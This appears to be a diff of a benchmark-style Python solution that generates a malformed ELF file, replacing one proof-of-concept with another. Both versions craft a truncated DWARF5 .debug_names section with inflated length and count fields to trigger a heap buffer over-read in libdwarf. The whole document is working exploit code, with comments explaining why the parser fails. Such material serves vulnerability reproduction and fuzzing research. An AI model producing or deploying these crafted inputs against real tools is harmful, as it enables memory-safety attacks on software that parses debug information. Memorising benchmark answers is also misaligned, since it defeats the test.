@@ -2,132 +2,104 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Helper functions for packing binary data (Little Endian)
-        def p8(x): return struct.pack('<B', x)
-        def p16(x): return struct.pack('<H', x)
-        def p32(x): return struct.pack('<I', x)
-        def p64(x): return struct.pack('<Q', x)
-
-        # -------------------------------------------------------------------------
-        # Vulnerability Strategy: Heap Buffer Overflow in .debug_names
-        # -------------------------------------------------------------------------
-        # The vulnerability lies in the handling of the DWARF5 .debug_names section.
-        # We construct an ELF file with a valid .debug_names section header but 
-        # corrupted content.
-        #
-        # 1. The ELF section header (sh_size) declares a small size (e.g., 36 bytes),
-        #    causing libdwarf to allocate a small buffer.
-        # 2. The DWARF unit header inside declares a larger `unit_length` and 
-        #    non-zero counts (e.g., comp_unit_count=20), implying more data follows.
-        # 3. libdwarf calculates limits based on the larger `unit_length` or blindly
-        #    iterates based on counts, failing to validate against the actual 
-        #    allocation size derived from sh_size.
-        # 4. This results in a Heap Buffer Over-read when accessing the missing entries.
-        # -------------------------------------------------------------------------
-
-        # --- 1. Construct .debug_names Payload ---
+        # Construct an ELF file with a malformed .debug_names section to trigger Heap Buffer Overflow
         
-        # DWARF5 Header Fields
-        version = 5
-        padding = 0
-        comp_unit_count = 20        # Claims 20 CUs exist
-        local_type_unit_count = 0
-        foreign_type_unit_count = 0
-        bucket_count = 0
-        name_count = 0
-        abbrev_table_size = 0
-        aug_str_size = 0
+        # ELF Header Constants
+        EI_MAG = b'\x7fELF'
+        EI_CLASS = 2  # ELFCLASS64
+        EI_DATA = 1   # ELFDATA2LSB
+        EI_VERSION = 1
+        EI_OSABI = 0
+        EI_ABIVERSION = 0
         
-        # Header body (32 bytes)
-        dnames_body = (
-            p16(version) +
-            p16(padding) +
-            p32(comp_unit_count) +
-            p32(local_type_unit_count) +
-            p32(foreign_type_unit_count) +
-            p32(bucket_count) +
-            p32(name_count) +
-            p32(abbrev_table_size) +
-            p32(aug_str_size)
-        )
-
-        # Calculate `unit_length`
-        # We claim the unit contains the header body (32) + the CU list (20 * 4 = 80 bytes).
-        # Total claimed size = 112 bytes.
-        unit_length = 112
+        # ELF Header
+        e_ident = EI_MAG + bytes([EI_CLASS, EI_DATA, EI_VERSION, EI_OSABI, EI_ABIVERSION]) + b'\x00' * 7
+        e_type = 2    # ET_EXEC
+        e_machine = 62 # EM_X86_64
+        e_version = 1
+        e_entry = 0x400000
+        e_phoff = 64
+        e_flags = 0
+        e_ehsize = 64
+        e_phentsize = 56
+        e_phnum = 1
+        e_shentsize = 64
+        e_shnum = 3
+        e_shstrndx = 2
         
-        # Actual payload data (Truncated)
-        # We only provide the length and the header body. We omit the CU list.
-        # Total provided bytes = 4 + 32 = 36 bytes.
-        dnames_data = p32(unit_length) + dnames_body
-
-        # --- 2. Construct ELF Container ---
-
-        # Section Header String Table (.shstrtab)
-        # Contains names: \x00, .shstrtab, .debug_names
+        # --- Malformed .debug_names Payload ---
+        # The vulnerability involves incorrect limit calculations or trusting header counts
+        # over actual data size. We create a section with a header that claims to have
+        # many buckets/entries (requiring a large read), but provide a truncated section.
+        
+        # DWARF5 .debug_names Header
+        # [0-3] unit_length: 0x100000 (Claim 1MB to bypass consistency checks against counts)
+        # [4-5] version: 5
+        # [6-7] padding: 0
+        # [8-11] comp_unit_count: 0
+        # [12-15] local_type_unit_count: 0
+        # [16-19] foreign_type_unit_count: 0
+        # [20-23] bucket_count: 0x10000 (65536 buckets -> requires reading 256KB)
+        # [24-27] name_count: 0
+        # [28-31] abbrev_table_size: 0
+        # [32-35] augmentation_string_size: 0
+        
+        fake_unit_length = 0x100000
+        bad_bucket_count = 0x10000
+        
+        dwarf_payload = struct.pack('<I', fake_unit_length) # unit_length
+        dwarf_payload += struct.pack('<H', 5) # version
+        dwarf_payload += struct.pack('<H', 0) # padding
+        dwarf_payload += struct.pack('<I', 0) # comp_unit_count
+        dwarf_payload += struct.pack('<I', 0) # local_type_unit_count
+        dwarf_payload += struct.pack('<I', 0) # foreign_type_unit_count
+        dwarf_payload += struct.pack('<I', bad_bucket_count) # bucket_count triggers read overflow
+        dwarf_payload += struct.pack('<I', 0) # name_count
+        dwarf_payload += struct.pack('<I', 0) # abbrev_table_size
+        dwarf_payload += struct.pack('<I', 0) # augmentation_string_size
+        # No augmentation string, no CUs, no TUs.
+        # Immediate start of Bucket Table (implicit).
+        # We stop the file here. The parser will try to read 256KB for buckets from here.
+        
+        # Helper structures for ELF
         shstrtab = b'\x00.shstrtab\x00.debug_names\x00'
         
-        # Calculate file offsets
-        # ELF Header: 64 bytes
-        # Section Headers: 3 entries * 64 bytes = 192 bytes
-        # Total headers size = 256 bytes
-        offset_shstrtab = 256
-        len_shstrtab = len(shstrtab)
+        # Offsets
+        payload_offset = 64 + 56 # ELF Header + Program Header
+        dwarf_offset = payload_offset
+        dwarf_size = len(dwarf_payload)
         
-        offset_dnames = offset_shstrtab + len_shstrtab
-        len_dnames = len(dnames_data) # 36 bytes
+        shstrtab_offset = dwarf_offset + dwarf_size
+        shstrtab_size = len(shstrtab)
         
-        # ELF Header (64-bit, Little Endian, System V)
-        e_ident = b'\x7fELF' + bytes([2, 1, 1, 0]) + b'\x00' * 8
-        ehdr = (
-            e_ident +
-            p16(1) +      # e_type (ET_REL)
-            p16(62) +     # e_machine (EM_X86_64)
-            p32(1) +      # e_version
-            p64(0) +      # e_entry
-            p64(0) +      # e_phoff
-            p64(64) +     # e_shoff (immediately after ELF header)
-            p32(0) +      # e_flags
-            p16(64) +     # e_ehsize
-            p16(0) +      # e_phentsize
-            p16(0) +      # e_phnum
-            p16(64) +     # e_shentsize
-            p16(3) +      # e_shnum (NULL, .shstrtab, .debug_names)
-            p16(1)        # e_shstrndx (.shstrtab index)
+        sh_offset = shstrtab_offset + shstrtab_size
+        
+        # Construct Headers
+        elf_header = struct.pack('<16sHHIQQQIHHHHHH',
+            e_ident, e_type, e_machine, e_version, e_entry, e_phoff,
+            sh_offset, e_flags, e_ehsize, e_phentsize, e_phnum,
+            e_shentsize, e_shnum, e_shstrndx
         )
         
-        # Section Header 0: NULL
-        sh_null = b'\x00' * 64
-        
-        # Section Header 1: .shstrtab
-        # Name offset 1 points to ".shstrtab"
-        sh_shstrtab = (
-            p32(1) +             # sh_name
-            p32(3) +             # sh_type (SHT_STRTAB)
-            p64(0) +             # sh_flags
-            p64(0) +             # sh_addr
-            p64(offset_shstrtab) + # sh_offset
-            p64(len_shstrtab) +  # sh_size
-            p32(0) +             # sh_link
-            p32(0) +             # sh_info
-            p64(1) +             # sh_addralign
-            p64(0)               # sh_entsize
+        prog_header = struct.pack('<IIQQQQQQ',
+            1, # PT_LOAD
+            5, # R_X
+            0, 0x400000, 0x400000,
+            sh_offset + 3*64, sh_offset + 3*64,
+            0x1000
         )
         
-        # Section Header 2: .debug_names
-        # Name offset 11 points to ".debug_names"
-        sh_dnames = (
-            p32(11) +            # sh_name
-            p32(1) +             # sh_type (SHT_PROGBITS)
-            p64(0) +             # sh_flags
-            p64(0) +             # sh_addr
-            p64(offset_dnames) + # sh_offset
-            p64(len_dnames) +    # sh_size (36 bytes - the trap)
-            p32(0) +             # sh_link
-            p32(0) +             # sh_info
-            p64(1) +             # sh_addralign
-            p64(0)               # sh_entsize
+        # Section Headers
+        sh_null = bytes(64)
+        
+        # .debug_names (Name index 11)
+        sh_dwarf = struct.pack('<IIQQQQIIQQ',
+            11, 1, 0, 0, dwarf_offset, dwarf_size, 0, 0, 1, 0
         )
         
-        # Assemble Final ELF
-        return ehdr + sh_null + sh_shstrtab + sh_dnames + shstrtab + dnames_data
+        # .shstrtab (Name index 1)
+        sh_str = struct.pack('<IIQQQQIIQQ',
+            1, 3, 0, 0, shstrtab_offset, shstrtab_size, 0, 0, 1, 0
+        )
+        
+        return elf_header + prog_header + dwarf_payload + shstrtab + sh_null + sh_dwarf + sh_str
